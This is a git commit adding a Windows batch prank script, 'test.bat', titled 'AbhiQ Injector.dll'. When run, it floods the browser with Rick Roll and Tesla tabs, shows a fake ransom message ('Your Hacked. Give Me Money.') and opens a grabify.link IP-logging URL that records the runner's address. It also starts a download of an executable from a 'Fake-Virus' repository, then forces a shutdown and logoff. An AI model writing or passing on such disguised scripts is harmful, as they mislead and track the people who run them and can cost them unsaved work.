e98d610d727042d590d40d4a4253f7bea64b9d7f
Abhinav <abhinav.ranish@outlook.com>
2021-08-17 09:34:43 +0300

    For Windows

---
+++ test.bat
@@ -0,0 +1,37 @@
+@echo off
+color f0
+echo Never Gonna Give You Up
+title AbhiQ Injector.dll
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+timeout /t 10
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start https://raw.githubusercontent.com/Abhinav-ranish/Fake-Virus/main/Windows%2011.exe
+start https://github.com/abhinav-ranish
+echo Your Hacked. Give Me Money.
+start https://grabify.link/PW7K20
+timeout /t 5
+start https://www.tesla.com/
+start https://www.tesla.com/
+start https://www.tesla.com/
+start https://www.tesla.com/
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start https://www.tesla.com/
+start https://www.tesla.com/
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+timeout /t 10
+start https://www.tesla.com/
+start https://www.tesla.com/
+start https://www.tesla.com/
+start https://www.tesla.com/
+timeout /t 1
+start https://www.tesla.com/
+shutdown/s
+start https://www.tesla.com/
+start https://www.tesla.com/
+start https://www.youtube.com/watch?v=dQw4w9WgXcQ
+timeout /t 15
+shutdown -l
